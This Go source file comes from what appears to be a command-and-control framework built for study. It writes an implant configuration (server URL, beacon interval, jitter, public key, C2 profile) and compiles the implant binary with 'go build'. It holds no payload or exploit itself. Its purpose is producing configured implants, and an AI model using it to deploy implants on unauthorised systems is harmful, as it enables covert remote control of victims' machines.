package generate

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"xhc2_for_studying/protocol"
)

// BuildImplant 编译 implant 目录，产出二进制到 outputPath。
// projectRoot 是项目根目录，outputPath 是二进制输出路径（如 ./implant-main）。
func BuildImplant(projectRoot, outputPath string) error {
	binaryPath := outputPath
	if !filepath.IsAbs(binaryPath) {
		binaryPath = filepath.Join(projectRoot, binaryPath)
	}

	cmd := exec.Command("go", "build", "-o", binaryPath, "./implant")
	cmd.Dir = projectRoot
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Env = os.Environ()

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("go build failed: %w", err)
	}
	return nil
}

// GenerateAndBuild 是生成+编译的一键入口。
func GenerateAndBuild(projectRoot, serverURL string, interval, jitter int64, serverPublicKey string, c2Profile *protocol.C2Profile, outputPath string) error {

	configBytes, err := GenerateImplantConfig(serverURL, interval, jitter, serverPublicKey, c2Profile)
	if err != nil {
		return fmt.Errorf("generate config: %w", err)
	}

	if err := WriteImplantConfig(projectRoot, configBytes); err != nil {
		return fmt.Errorf("write config: %w", err)
	}

	if err := BuildImplant(projectRoot, outputPath); err != nil {
		return fmt.Errorf("build implant: %w", err)
	}

	return nil
}
